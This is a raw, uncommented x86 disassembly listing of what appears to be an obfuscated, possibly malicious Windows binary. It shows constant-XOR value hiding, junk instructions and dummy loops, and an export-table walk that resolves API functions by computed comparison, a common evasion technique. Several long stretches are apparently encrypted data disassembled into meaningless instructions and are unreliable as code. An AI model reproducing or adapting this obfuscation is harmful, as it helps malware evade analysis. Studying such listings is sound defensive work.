  40ccad:	pop    esi
  40ccae:	je     0x40ccbc
  40ccb4:	mov    eax,DWORD PTR [ebp+0x8]
  40ccb7:	jmp    0x40ccd5
  40ccbc:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbf:	xor    eax,edx
  40ccc1:	add    eax,ecx
  40ccc3:	jmp    0x40ccd5
  40ccc8:	mov    eax,DWORD PTR [ebp-0x4]
  40cccb:	xor    eax,0x7510854
  40ccd0:	add    eax,0x32729b
  40ccd5:	leave  
  40ccd6:	ret    0x4
  40ccd9:	push   ebp
  40ccda:	mov    ebp,esp
  40ccdc:	mov    eax,ds:0x41222c
  40cce1:	mov    edx,0x32729b
  40cce6:	sub    eax,edx
  40cce8:	mov    ecx,0x7510854
  40cced:	push   esi
  40ccee:	inc    esi
  40ccef:	mov    esi,DWORD PTR [ebp+0xc]
  40ccf2:	or     DWORD PTR ds:0x42e7cc,0x4ea0
  40ccfc:	xor    eax,ecx
  40ccfe:	cmp    eax,esi
  40cd00:	mov    DWORD PTR ds:0x4304d7,0x1f44
  40cd0a:	je     0x40cda9
  40cd10:	mov    esi,DWORD PTR ds:0x42ee59
  40cd16:	mov    eax,ds:0x43047d
  40cd1b:	sub    esi,eax
  40cd1d:	imul   esi,DWORD PTR [esi+eax*1]
  40cd21:	mov    eax,ds:0x412224
  40cd26:	and    esi,DWORD PTR ds:0x42edd7
  40cd2c:	mov    esi,DWORD PTR [ebp+0xc]
  40cd2f:	sub    eax,edx
  40cd31:	sbb    DWORD PTR ds:0x43046d,0x6758
  40cd3b:	xor    eax,ecx
  40cd3d:	mov    DWORD PTR ds:0x4304e7,0x7cb5
  40cd47:	cmp    eax,esi
  40cd49:	mov    DWORD PTR ds:0x42e7c0,0x28eb
  40cd53:	jne    0x40cd7d
  40cd59:	mov    eax,ds:0x41222c
  40cd5e:	xor    DWORD PTR ds:0x430471,0x42edcf
  40cd68:	add    eax,DWORD PTR ds:0x412224
  40cd6e:	mov    DWORD PTR ds:0x430439,0x6115
  40cd78:	jmp    0x40cd93
  40cd7d:	sbb    eax,0x6db0
  40cd82:	mov    eax,DWORD PTR [ebp+0xc]
  40cd85:	adc    DWORD PTR ds:0x43043d,0x430449
  40cd8f:	xor    eax,ecx
  40cd91:	add    eax,edx
  40cd93:	mov    ds:0x412224,eax
  40cd98:	mov    eax,DWORD PTR [ebp+0xc]
  40cd9b:	xor    eax,ecx
  40cd9d:	add    eax,edx
  40cd9f:	mov    ds:0x41222c,eax
  40cda4:	jmp    0x40cdb3
  40cda9:	mov    eax,ds:0x41222c
  40cdae:	mov    ds:0x412224,eax
  40cdb3:	mov    eax,DWORD PTR [ebp+0x8]
  40cdb6:	mov    eax,DWORD PTR [eax]
  40cdb8:	mov    ecx,DWORD PTR ds:0x412224
  40cdbe:	add    DWORD PTR [eax],ecx
  40cdc0:	pop    esi
  40cdc1:	pop    ebp
  40cdc2:	ret    0x8
  40cdc5:	push   ebp
  40cdc6:	mov    ebp,esp
  40cdc8:	sub    esp,0x30
  40cdcb:	sbb    eax,DWORD PTR ds:0x42edcb
  40cdd1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cdd8:	and    DWORD PTR ds:0x430449,0x0
  40cde2:	mov    eax,ds:0x430449
  40cde7:	inc    eax
  40cde8:	mov    ds:0x430449,eax
  40cded:	cmp    DWORD PTR ds:0x430449,0x18
  40cdf4:	jne    0x40ce06
  40cdfa:	push   DWORD PTR [ebp-0x10]
  40cdfd:	push   DWORD PTR [ebp-0x1c]
  40ce00:	call   DWORD PTR ds:0x42eacf
  40ce06:	cmp    DWORD PTR ds:0x430449,0x13
  40ce0d:	jb     0x40cde2
  40ce13:	adc    DWORD PTR ds:0x42edd7,0x4965
  40ce1d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40ce24:	mov    ecx,DWORD PTR [ebp-0x4]
  40ce27:	sub    DWORD PTR ds:0x4304cf,0x97c
  40ce31:	push   ebx
  40ce32:	adc    ebx,eax
  40ce34:	mov    eax,0x7510854
  40ce39:	xor    ecx,eax
  40ce3b:	add    ebx,0x6e38
  40ce41:	mov    ebx,0x32729b
  40ce46:	add    ecx,ebx
  40ce48:	mov    DWORD PTR [ebp-0x1c],ecx
  40ce4b:	and    ecx,0x1130
  40ce51:	mov    ecx,DWORD PTR [ebp+0x14]
  40ce54:	sub    DWORD PTR ds:0x42ede3,0x4304df
  40ce5e:	push   esi
  40ce5f:	push   edi
  40ce60:	test   ecx,ecx
  40ce62:	mov    DWORD PTR ds:0x42e7cc,0x9d3
  40ce6c:	je     0x40cf83
  40ce72:	mov    DWORD PTR ds:0x43043d,0x17
  40ce7c:	cmp    DWORD PTR ds:0x43043d,0x0
  40ce83:	je     0x40cf64
  40ce89:	cmp    DWORD PTR ds:0x43043d,0x5
  40ce90:	jne    0x40ced0
  40ce96:	push   0x56ae
  40ce9b:	push   DWORD PTR [ebp-0x28]
  40ce9e:	push   0x17dc
  40cea3:	push   0x51d4
  40cea8:	push   DWORD PTR [ebp-0x28]
  40ceab:	push   0x8ee9
  40ceb0:	push   DWORD PTR [ebp-0x1c]
  40ceb3:	push   0x10f5
  40ceb8:	push   DWORD PTR [ebp-0x18]
  40cebb:	push   0x42e7dc
  40cec0:	push   0x42e8e3
  40cec5:	push   0x4a36
  40ceca:	call   DWORD PTR ds:0x42ec43
  40ced0:	cmp    DWORD PTR ds:0x43043d,0x6
  40ced7:	jne    0x40ceea
  40cedd:	mov    edi,DWORD PTR ds:0x43043d
  40cee3:	dec    edi
  40cee4:	mov    DWORD PTR ds:0x43043d,edi
  40ceea:	mov    edi,DWORD PTR ds:0x43043d
  40cef0:	dec    edi
  40cef1:	mov    DWORD PTR ds:0x43043d,edi
  40cef7:	jmp    0x40ce7c
  40cefc:	mov    DWORD PTR ds:0x42e7d4,0x14
  40cf06:	cmp    DWORD PTR ds:0x42e7d4,0x0
  40cf0d:	je     0x40cf64
  40cf13:	cmp    DWORD PTR ds:0x42e7d4,0x5
  40cf1a:	jne    0x40cf36
  40cf20:	push   DWORD PTR [ebp-0x28]
  40cf23:	push   0x43044d
  40cf28:	push   DWORD PTR [ebp-0x24]
  40cf2b:	push   0x3dba
  40cf30:	call   DWORD PTR ds:0x42ec47
  40cf36:	cmp    DWORD PTR ds:0x42e7d4,0x6
  40cf3d:	jne    0x40cf50
  40cf43:	mov    esi,DWORD PTR ds:0x42e7d4
  40cf49:	dec    esi
  40cf4a:	mov    DWORD PTR ds:0x42e7d4,esi
  40cf50:	mov    esi,DWORD PTR ds:0x42e7d4
  40cf56:	dec    esi
  40cf57:	mov    DWORD PTR ds:0x42e7d4,esi
  40cf5d:	jmp    0x40cf06
  40cf62:	add    edi,ecx
  40cf64:	mov    ecx,DWORD PTR [ebp+0x14]
  40cf67:	xor    DWORD PTR ds:0x42edef,0x2c6d
  40cf71:	mov    ecx,DWORD PTR [ecx]
  40cf73:	movzx  edi,BYTE PTR ds:0x42e7c4
  40cf7a:	sbb    DWORD PTR ds:0x430435,edi
  40cf80:	mov    DWORD PTR [ebp-0x1c],ecx
  40cf83:	imul   edx,eax
  40cf86:	mov    ecx,0x4573
  40cf8b:	mov    DWORD PTR ds:0x4304db,0x1f
  40cf95:	cmp    DWORD PTR ds:0x4304db,0x0
  40cf9c:	je     0x40cfed
  40cfa2:	cmp    DWORD PTR ds:0x4304db,0x9
  40cfa9:	jne    0x40cfbd
  40cfaf:	push   0x42eddb
  40cfb4:	push   DWORD PTR [ebp-0x1c]
  40cfb7:	call   DWORD PTR ds:0x42ea0f
  40cfbd:	cmp    DWORD PTR ds:0x4304db,0xa
  40cfc4:	jne    0x40cfd7
  40cfca:	mov    esi,DWORD PTR ds:0x4304db
  40cfd0:	dec    esi
  40cfd1:	mov    DWORD PTR ds:0x4304db,esi
  40cfd7:	xor    esi,esi
  40cfd9:	or     esi,DWORD PTR ds:0x4304db
  40cfdf:	dec    esi
  40cfe0:	mov    DWORD PTR ds:0x4304db,esi
  40cfe6:	jmp    0x40cf95
  40cfeb:	add    esi,edi
  40cfed:	add    edx,ecx
  40cfef:	mov    DWORD PTR ds:0x42edf3,0x11
  40cff9:	cmp    DWORD PTR ds:0x42edf3,0x0
  40d000:	je     0x40d094
  40d006:	cmp    DWORD PTR ds:0x42edf3,0x3
  40d00d:	jne    0x40d024
  40d013:	push   DWORD PTR [ebp-0x18]
  40d016:	push   0x42e7d8
  40d01b:	push   DWORD PTR [ebp-0x18]
  40d01e:	call   DWORD PTR ds:0x42ec4b
  40d024:	cmp    DWORD PTR ds:0x42edf3,0x4
  40d02b:	jne    0x40d03e
  40d031:	mov    esi,DWORD PTR ds:0x42edf3
  40d037:	dec    esi
  40d038:	mov    DWORD PTR ds:0x42edf3,esi
  40d03e:	mov    esi,DWORD PTR ds:0x42edf3
  40d044:	dec    esi
  40d045:	mov    DWORD PTR ds:0x42edf3,esi
  40d04b:	jmp    0x40cff9
  40d050:	and    DWORD PTR ds:0x430439,0x0
  40d05a:	mov    esi,DWORD PTR ds:0x430439
  40d060:	inc    esi
  40d061:	mov    DWORD PTR ds:0x430439,esi
  40d067:	cmp    DWORD PTR ds:0x430439,0x23
  40d06e:	jne    0x40d087
  40d074:	push   0x4365
  40d079:	push   0x641d
  40d07e:	push   DWORD PTR [ebp-0xc]
  40d081:	call   DWORD PTR ds:0x42ea13
  40d087:	cmp    DWORD PTR ds:0x430439,0x19
  40d08e:	jb     0x40d05a
  40d094:	mov    esi,0x7879
  40d099:	mov    edi,DWORD PTR ds:0x42eddb
  40d09f:	sub    DWORD PTR ds:0x42e7bc,edi
  40d0a5:	mov    edi,0x1556
  40d0aa:	xchg   esi,ecx
  40d0ac:	mov    ecx,DWORD PTR ds:0x42eddf
  40d0b2:	xor    DWORD PTR ds:0x42ede7,ecx
  40d0b8:	sub    edx,edi
  40d0ba:	xor    esi,esi
  40d0bc:	movzx  ecx,WORD PTR ds:0x42e7d4
  40d0c3:	or     DWORD PTR ds:0x430441,ecx
  40d0c9:	mov    DWORD PTR [ebp-0x28],esi
  40d0cc:	or     ecx,DWORD PTR ds:0x42edf3
  40d0d2:	mov    DWORD PTR [ebp-0x2c],esi
  40d0d5:	sbb    DWORD PTR ds:0x43044d,ebx
  40d0db:	mov    DWORD PTR [ebp-0x14],esi
  40d0de:	or     DWORD PTR ds:0x42eddb,ebx
  40d0e4:	mov    DWORD PTR [ebp-0x8],esi
  40d0e7:	mov    ecx,DWORD PTR ds:0x4304eb
  40d0ed:	xor    DWORD PTR ds:0x42eddf,ecx
  40d0f3:	mov    ecx,DWORD PTR [ebp-0x18]
  40d0f6:	xor    ecx,eax
  40d0f8:	xor    DWORD PTR ds:0x42edd7,0x70e3
  40d102:	xor    edi,edi
  40d104:	movzx  eax,BYTE PTR ds:0x42edcf
  40d10b:	or     DWORD PTR ds:0x42eddb,eax
  40d111:	jmp    0x40d25a
  40d116:	adc    al,0xe1
  40d118:	addr16 jp 0x40d18e
  40d11b:	clc    
  40d11c:	jno    0x40d10f
  40d11e:	inc    ebx
  40d11f:	xor    bl,al
  40d121:	xor    DWORD PTR [esi+esi*2+0x40],ebx
  40d125:	outs   dx,DWORD PTR ds:[esi]
  40d126:	stc    
  40d127:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f22
  40d12e:	int    0xda
  40d130:	push   ecx
  40d131:	lods   al,BYTE PTR ds:[esi]
  40d132:	(bad)  
  40d133:	fisubr WORD PTR [ebx-0x40c10c8f]
  40d139:	mov    ebp,0xc9f01ad7
  40d13e:	(bad)  
  40d13f:	ds inc eax
  40d141:	xchg   BYTE PTR [ecx],bl
  40d143:	push   edx
  40d144:	dec    eax
  40d145:	mov    dh,0x1d
  40d147:	shl    DWORD PTR [eax],cl
  40d149:	cmp    ah,BYTE PTR [eax+edi*4-0x62]
  40d14d:	ss leave 
  40d14f:	pop    esi
  40d150:	hlt    
  40d151:	push   ebp
  40d152:	sahf   
  40d153:	cmp    DWORD PTR [eax+esi*2+0x6d],esi
  40d157:	cmp    ah,cl
  40d159:	fstp   DWORD PTR [eax+ecx*8-0x148b951a]
  40d160:	in     eax,dx
  40d161:	dec    ebp
  40d162:	cs addr16 mov cl,0x73
  40d166:	mov    ebp,0x3e81148d
  40d16b:	std    
  40d16c:	fcomip st,st(0)
  40d16e:	xor    DWORD PTR [ecx+0x4dfb08aa],edi
  40d174:	outs   dx,DWORD PTR ds:[esi]
  40d175:	or     ecx,eax
  40d177:	dec    esp
  40d178:	and    edi,ebp
  40d17a:	ja     0x40d1ac
  40d17c:	xor    eax,0x93464154
  40d181:	jmp    0x40d121
  40d183:	imul   al
  40d185:	sub    al,0x97
  40d187:	das    
  40d188:	pop    esi
  40d189:	inc    edx
  40d18a:	mov    ds:0x3223e3f3,eax
  40d18f:	in     eax,dx
  40d190:	sbb    esi,DWORD PTR [edx-0x48b729cf]
  40d196:	inc    edx
  40d197:	repz jmp FWORD PTR [esi+0x2017ed49]
  40d19e:	call   0xb619:0x6b4921b4
  40d1a5:	aad    0x54
  40d1a7:	(bad)  
  40d1a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1a9:	lahf   
  40d1aa:	adc    eax,0x7af50020
  40d1af:	dec    eax
  40d1b0:	pop    ebx
  40d1b1:	mov    WORD PTR [edx+0x6f9cbb02],?
  40d1b7:	cs ins BYTE PTR es:[edi],dx
  40d1b9:	aas    
  40d1ba:	add    BYTE PTR [eax+ebp*8],bh
  40d1bd:	ret    0x95bf
  40d1c0:	test   BYTE PTR [ebx],0xa5
  40d1c3:	aam    0x3b
  40d1c5:	ficom  DWORD PTR [edx+0x6624637c]
  40d1cb:	iret   
  40d1cc:	mov    BYTE PTR [esi-0x58edaf6e],bh
  40d1d2:	aam    0xf4
  40d1d4:	fistp  DWORD PTR [edi+0x4e]
  40d1d7:	or     BYTE PTR [edi+0x30],0xcd
  40d1db:	sbb    eax,0x3f227b3a
  40d1e0:	jae    0x40d21d
  40d1e2:	int3   
  40d1e3:	(bad)  
  40d1e5:	add    DWORD PTR [edi+eax*8],0xffffffa5
  40d1e9:	call   0x8e6d544c
  40d1ee:	stos   BYTE PTR es:[edi],al
  40d1ef:	xor    al,ah
  40d1f1:	mov    eax,0x416cfca9
  40d1f6:	jnp    0x40d1f7
  40d1f8:	rcr    ebp,0x8b
  40d1fb:	loopne 0x40d191
  40d1fd:	repz mov edi,0x9ed9239c
  40d203:	das    
  40d204:	sbb    BYTE PTR [eax+0x3d10ce65],bh
  40d20a:	cmp    eax,0xf444303f
  40d20f:	stos   DWORD PTR es:[edi],eax
  40d210:	(bad)  
  40d211:	into   
  40d212:	addr16 in al,dx
  40d214:	sbb    al,BYTE PTR [ecx-0x6a]
  40d217:	ins    BYTE PTR es:[edi],dx
  40d218:	test   eax,0x72e8eba2
  40d21d:	mov    WORD PTR [ebx],ss
  40d21f:	pusha  
  40d220:	push   es
  40d221:	pop    eax
  40d222:	ret    0x3853
  40d225:	cs in  al,0xc4
  40d228:	pop    es
  40d229:	xchg   esi,eax
  40d22a:	mov    ch,0xc0
  40d22c:	jge    0x40d212
  40d22e:	add    DWORD PTR [esi],esp
  40d230:	mov    edi,0x6d18dcc1
  40d235:	(bad)  
  40d236:	gs jp  0x40d206
  40d239:	stos   BYTE PTR es:[edi],al
  40d23a:	push   ebx
  40d23b:	dec    ebp
  40d23c:	gs out 0xf8,al
  40d23f:	mov    DWORD PTR [edx],edi
  40d241:	mov    cl,0x46
  40d243:	mov    bh,0xef
  40d245:	pop    es
  40d246:	mov    al,ds:0xb85783d
  40d24b:	push   ecx
  40d24c:	xchg   ebx,eax
  40d24d:	pushf  
  40d24e:	dec    ebp
  40d24f:	pop    esi
  40d250:	adc    esp,DWORD PTR [edx]
  40d252:	aas    
  40d253:	mov    cl,BYTE PTR [eax+0x2abae038]
  40d259:	rol    BYTE PTR [ebx],cl
  40d25b:	retf   
  40d25c:	mov    DWORD PTR [ebp-0x20],ecx
  40d25f:	mov    eax,ds:0x4304e7
  40d264:	mov    eax,DWORD PTR [ebp-0x20]
  40d267:	je     0x40d591
  40d26d:	mov    eax,DWORD PTR [ebp-0x4]
  40d270:	and    DWORD PTR ds:0x42ede7,0x42e7c4
  40d27a:	xor    eax,0x7510854
  40d27f:	or     DWORD PTR ds:0x42edef,0x3ff6
  40d289:	add    eax,ebx
  40d28b:	mov    DWORD PTR ds:0x42eddf,0x774f
  40d295:	cmp    edi,eax
  40d297:	mov    DWORD PTR ds:0x42edd7,0x9b6
  40d2a1:	jne    0x40d3eb
  40d2a7:	push   DWORD PTR [ebp+0x8]
  40d2aa:	sub    DWORD PTR ds:0x430439,0x430445
  40d2b4:	call   0x40cbbb
  40d2b9:	mov    ecx,DWORD PTR ds:0x4304df
  40d2bf:	add    DWORD PTR ds:0x42edd7,ecx
  40d2c5:	mov    DWORD PTR [ebp-0x20],eax
  40d2c8:	add    ecx,ecx
  40d2ca:	mov    eax,DWORD PTR [ebp-0x4]
  40d2cd:	mov    ecx,DWORD PTR [ebp-0x20]
  40d2d0:	mov    esi,DWORD PTR ds:0x42e96f
  40d2d6:	mov    esi,DWORD PTR [esi]
  40d2d8:	and    DWORD PTR ds:0x430465,esi
  40d2de:	mov    esi,0x7510854
  40d2e3:	sub    DWORD PTR ds:0x43045d,0x42edd3
  40d2ed:	xor    eax,esi
  40d2ef:	add    eax,ebx
  40d2f1:	mov    DWORD PTR ds:0x42e7c4,0x6de1
  40d2fb:	cmp    ecx,eax
  40d2fd:	mov    DWORD PTR ds:0x430449,0x4fd
  40d307:	je     0x40d575
  40d30d:	sbb    DWORD PTR ds:0x430465,0x43043d
  40d317:	push   DWORD PTR [ebp-0x20]
  40d31a:	push   DWORD PTR [ebp+0x8]
  40d31d:	mov    DWORD PTR ds:0x42e7c4,0x2d65
  40d327:	call   0x4041b8
  40d32c:	xor    DWORD PTR ds:0x42edeb,0x6710
  40d336:	mov    DWORD PTR [ebp-0x14],eax
  40d339:	or     DWORD PTR ds:0x430449,0x4304d3
  40d343:	mov    eax,DWORD PTR [ebp-0x4]
  40d346:	adc    DWORD PTR ds:0x430435,0x2fc0
  40d350:	mov    ecx,DWORD PTR [ebp-0x14]
  40d353:	add    DWORD PTR ds:0x43044d,0x5a83
  40d35d:	xor    eax,esi
  40d35f:	add    eax,ebx
  40d361:	mov    DWORD PTR ds:0x430461,0x3b14
  40d36b:	cmp    ecx,eax
  40d36d:	je     0x40d575
  40d373:	mov    eax,DWORD PTR [ebp-0x14]
  40d376:	and    DWORD PTR ds:0x43045d,0x0
  40d380:	mov    ecx,DWORD PTR ds:0x43045d
  40d386:	inc    ecx
  40d387:	mov    DWORD PTR ds:0x43045d,ecx
  40d38d:	cmp    DWORD PTR ds:0x43045d,0x1d
  40d394:	jne    0x40d3b2
  40d39a:	push   0x430441
  40d39f:	push   0x883a
  40d3a4:	push   0x157c
  40d3a9:	push   DWORD PTR [ebp-0x28]
  40d3ac:	call   DWORD PTR ds:0x42ead3
  40d3b2:	cmp    DWORD PTR ds:0x43045d,0x18
  40d3b9:	jb     0x40d380
  40d3bf:	mov    eax,DWORD PTR [eax+0x18]
  40d3c2:	mov    DWORD PTR [ebp-0x20],eax
  40d3c5:	mov    eax,DWORD PTR [ebp-0x14]
  40d3c8:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3cb:	add    ecx,DWORD PTR [eax+0x20]
  40d3ce:	mov    DWORD PTR [ebp-0x28],ecx
  40d3d1:	mov    eax,DWORD PTR [ebp-0x14]
  40d3d4:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3d7:	add    ecx,DWORD PTR [eax+0x24]
  40d3da:	mov    DWORD PTR [ebp-0x2c],ecx
  40d3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40d3e0:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3e3:	add    ecx,DWORD PTR [eax+0x1c]
  40d3e6:	xor    esi,esi
  40d3e8:	mov    DWORD PTR [ebp-0x14],ecx
  40d3eb:	mov    eax,DWORD PTR [ebp-0x28]
  40d3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3f1:	add    ecx,DWORD PTR [eax+edi*4]
  40d3f4:	lea    eax,[ebp-0x8]
  40d3f7:	mov    DWORD PTR [ebp-0x30],ecx
  40d3fa:	push   eax
  40d3fb:	push   DWORD PTR [ebp-0x30]
  40d3fe:	jmp    0x40d547
  40d403:	add    al,BYTE PTR [ebx]
  40d405:	in     eax,dx
  40d406:	jecxz  0x40d3f5
  40d408:	icebp  
  40d409:	adc    bl,ah
  40d40b:	push   0x5f6a8e30
  40d410:	mov    al,ds:0x8ead4227
  40d415:	jle    0x40d495
  40d417:	and    bh,BYTE PTR [edi+0x7e]
  40d41a:	jle    0x40d3b5
  40d41c:	mov    al,ds:0xa0f9a86e
  40d421:	lock mov dl,0x34
  40d424:	clc    
  40d425:	push   DWORD PTR [ebx+0x655f38d2]
  40d42b:	or     al,0x6
  40d42d:	nop
  40d42e:	out    0x9,eax
  40d430:	std    
  40d431:	mov    WORD PTR [ecx-0x28],?
  40d434:	or     al,dl
  40d436:	mov    edx,0x8d1c7d7b
  40d43b:	rol    BYTE PTR [ebp-0x1eee12a0],0xba
  40d442:	cdq    
  40d443:	(bad)  [edx+0x2dab40f0]
  40d449:	mov    al,0xb2
  40d44b:	jnp    0x40d433
  40d44d:	popf   
  40d44e:	xor    al,0xde
  40d450:	outs   dx,DWORD PTR ds:[esi]
  40d451:	mov    dl,0x92
  40d453:	aam    0xba
  40d455:	mov    cl,0x72
  40d457:	or     eax,0xc1dce71e
  40d45c:	test   BYTE PTR [edx],cl
  40d45e:	test   al,0xd3
  40d460:	loop   0x40d487
  40d462:	push   cs
  40d463:	adc    BYTE PTR [esi],bl
  40d465:	or     BYTE PTR [edx-0x6cc1b96a],dh
  40d46b:	sbb    eax,0x4f1f48a0
  40d470:	leave  
  40d471:	sbb    al,0x25
  40d473:	cmp    al,bh
  40d475:	rcr    ch,1
  40d477:	std    
  40d478:	stc    
  40d479:	pop    esi
  40d47a:	aaa    
  40d47b:	push   cs
  40d47c:	sub    DWORD PTR ds:[esi-0x1fe2aa7c],edi
  40d483:	or     bh,ah
  40d485:	add    dh,BYTE PTR [eax]
  40d487:	and    DWORD PTR [edx],0xd4a4eaf5
  40d48d:	(bad)  
  40d48e:	jo     0x40d4f8
  40d490:	retf   
  40d491:	stos   DWORD PTR es:[edi],eax
  40d492:	sbb    ah,BYTE PTR [ecx+0x6fdf9153]
  40d498:	daa    
  40d499:	fbld   TBYTE PTR [eax+0x3621a476]
  40d49f:	xor    BYTE PTR [ebx],dl
  40d4a1:	xor    ebp,DWORD PTR [ebx]
  40d4a3:	mov    bl,0x16
  40d4a5:	or     eax,0x9a471ddd
  40d4aa:	or     BYTE PTR [edx-0x1e37b9fc],cl
  40d4b0:	jnp    0x40d4ea
  40d4b2:	(bad)  
  40d4b3:	retf   0x30ef
  40d4b6:	sub    al,0x50
  40d4b8:	xor    DWORD PTR [edx-0x50623ae1],ecx
  40d4be:	pop    esp
  40d4bf:	sub    eax,0xdaa8ff55
  40d4c4:	sbb    al,0x48
  40d4c6:	int    0x60
  40d4c8:	jo     0x40d451
  40d4ca:	add    BYTE PTR [ecx],0x2a
  40d4cd:	daa    
  40d4ce:	inc    esi
  40d4cf:	ja     0x40d4dc
  40d4d1:	push   ds
  40d4d2:	leave  
  40d4d3:	pop    ss
  40d4d4:	mov    dh,0x10
  40d4d6:	pop    ecx
  40d4d7:	push   ebx
  40d4d8:	mov    BYTE PTR [edx-0x7d],ah
  40d4db:	mov    bh,0x69
  40d4dd:	and    DWORD PTR [ebx+0x2fa06b89],esp
  40d4e3:	push   ds
  40d4e4:	hlt    
  40d4e5:	mov    WORD PTR [ecx-0x42],es
  40d4e8:	or     ch,bh
  40d4ea:	adc    al,0x59
  40d4ec:	popa   
  40d4ed:	int    0xb2
  40d4ef:	mov    cl,0xbd
  40d4f1:	or     DWORD PTR [ebp-0x63],0xffffff9d
  40d4f5:	mov    DWORD PTR [esi+0x2],0x20adbd64
  40d4fc:	fwait
  40d4fd:	sbb    eax,0xd65ef4a3
  40d502:	mov    edx,0xcec9fe91
  40d507:	sub    eax,0x6e685796
  40d50c:	(bad)  
  40d50d:	ins    BYTE PTR es:[edi],dx
  40d50e:	fdivr  QWORD PTR [edx-0x33a6e845]
  40d514:	xor    eax,0xf4d0560
  40d519:	sbb    eax,0xff1cc2c4
  40d51e:	cmp    BYTE PTR [ebx-0x10189127],dl
  40d524:	mov    edi,0xd2e935f1
  40d529:	xor    BYTE PTR [edi+0x4a72c7fc],dh
  40d52f:	cli    
  40d530:	iret   
  40d531:	ret    
  40d532:	xchg   ecx,eax
  40d533:	push   esi
  40d534:	leave  
  40d535:	mov    dl,0x8b
  40d537:	mov    al,ds:0xeaca89be
  40d53c:	push   ds
  40d53d:	sbb    BYTE PTR [esi+0x73792c7e],ah
  40d543:	rol    DWORD PTR [ebx+0x62],cl
  40d546:	mov    ch,0xff
  40d548:	jne    0x40d556
  40d54a:	call   0x402e68
  40d54f:	mov    eax,DWORD PTR [ebp-0x4]
  40d552:	mov    ecx,DWORD PTR [ebp-0x8]
  40d555:	xor    eax,0x7510854
  40d55a:	add    eax,ebx
  40d55c:	cmp    ecx,eax
  40d55e:	jne    0x40d581
  40d564:	mov    eax,DWORD PTR [ebp-0x20]
  40d567:	inc    edi
  40d568:	cmp    edi,eax
  40d56a:	jb     0x40d26d
  40d570:	jmp    0x40d591
  40d575:	mov    eax,DWORD PTR [ebp-0x4]
  40d578:	xor    eax,esi
  40d57a:	add    eax,ebx
  40d57c:	jmp    0x40dfde
  40d581:	mov    eax,DWORD PTR [ebp-0x2c]
  40d584:	movzx  eax,WORD PTR [eax+edi*2]
  40d588:	mov    ecx,DWORD PTR [ebp-0x14]
  40d58b:	mov    eax,DWORD PTR [ecx+eax*4]
  40d58e:	mov    DWORD PTR [ebp+0xc],eax
  40d591:	mov    eax,DWORD PTR [ebp-0x4]
  40d594:	mov    ecx,DWORD PTR [ebp-0x8]
  40d597:	xor    eax,0x7510854
  40d59c:	add    eax,ebx
  40d59e:	cmp    ecx,eax
  40d5a0:	jne    0x40d6fc
  40d5a6:	jmp    0x40d6ef
  40d5ab:	aad    0x5b
  40d5ad:	fstp   DWORD PTR [ecx+0x73559971]
  40d5b3:	push   0x64
  40d5b5:	fsin   
  40d5b7:	in     al,0xf9
  40d5b9:	pop    esp
  40d5ba:	push   es
  40d5bb:	push   ecx
  40d5bc:	(bad)  
  40d5bd:	jle    0x40d63d
  40d5bf:	and    bh,BYTE PTR [edi+0x7e]
  40d5c2:	jle    0x40d637
  40d5c4:	mov    WORD PTR [edx],cs
  40d5c6:	(bad)  
  40d5c7:	ss dec eax
  40d5c9:	dec    ebp
  40d5ca:	je     0x40d5be
  40d5cc:	xchg   ecx,eax
  40d5cd:	(bad)  
  40d5ce:	aad    0xae
  40d5d0:	(bad)  
  40d5d1:	pop    edi
  40d5d2:	sub    DWORD PTR [ebp+0x1bec54cf],ebx
  40d5d8:	or     BYTE PTR [ecx-0x36],0x11
  40d5dc:	mov    BYTE PTR [esi+ebp*1+0x1c],cl
  40d5e0:	mov    ecx,DWORD PTR [ebx-0x60]
  40d5e3:	inc    esp
  40d5e4:	dec    esp
  40d5e5:	cld    
  40d5e6:	xchg   ebp,eax
  40d5e7:	pop    eax
  40d5e8:	enter  0x7ce0,0x9
  40d5ec:	inc    ebx
  40d5ed:	mov    eax,0x5d96956a
  40d5f2:	jmp    0x80e73203
  40d5f7:	out    dx,eax
  40d5f8:	stc    
  40d5f9:	push   0x9dc04ae4
  40d5fe:	icebp  
  40d5ff:	add    DWORD PTR [ebp-0x13],ebp
  40d602:	push   esi
  40d603:	pop    ebp
  40d604:	pop    edi
  40d605:	dec    eax
  40d606:	and    eax,0xfc7dd88a
  40d60b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d60c:	jp     0x40d61e
  40d60e:	or     ebx,DWORD PTR [ebx]
  40d610:	repz stc 
  40d612:	(bad)  
  40d613:	icebp  
  40d614:	jnp    0x40d60c
  40d616:	or     eax,0x3c961573
  40d61b:	fs hlt 
  40d61d:	enter  0x75e1,0xc
  40d621:	and    eax,DWORD PTR [ebp+0x11fd4d5b]
  40d627:	iret   
  40d628:	mov    ah,0x59
  40d62a:	add    eax,0x2969801a
  40d62f:	iret   
  40d630:	adc    edx,DWORD PTR [eax]
  40d632:	jmp    0x72b68f68
  40d637:	mov    ah,0xc2
  40d639:	adc    ah,BYTE PTR [eax+ebx*1-0x25]
  40d63d:	pop    edi
  40d63e:	iret   
  40d63f:	mov    ah,0x3
  40d641:	jne    0x40d69c
  40d643:	hlt    
  40d644:	mov    ecx,0x4af3a46d
  40d649:	xor    al,0xf1
  40d64b:	loopne 0x40d693
  40d64d:	dec    ebp
  40d64e:	push   ebx
  40d64f:	addr16 sahf 
  40d651:	out    0x49,eax
  40d653:	mov    ecx,0x8c04b719
  40d658:	xlat   BYTE PTR ds:[ebx]
  40d659:	dec    esp
  40d65a:	std    
  40d65b:	mov    edx,0x6715c6a5
  40d660:	loopne 0x40d677
  40d662:	das    
  40d663:	(bad)  
  40d665:	(bad)  
  40d666:	push   0x18b136de
  40d66b:	jno    0x40d621
  40d66d:	xor    dh,bh
  40d66f:	test   al,0xcc
  40d671:	cmp    ah,dl
  40d673:	(bad)  
  40d674:	xchg   esi,eax
  40d675:	pop    esi
  40d676:	adc    ecx,ecx
  40d678:	dec    edi
  40d679:	push   cx
  40d67b:	(bad)
  40d67e:	xor    DWORD PTR [ebp*1+0x74a791b0],ecx
  40d685:	into   
  40d686:	push   ebp
  40d687:	adc    DWORD PTR [edx+0x49],edx
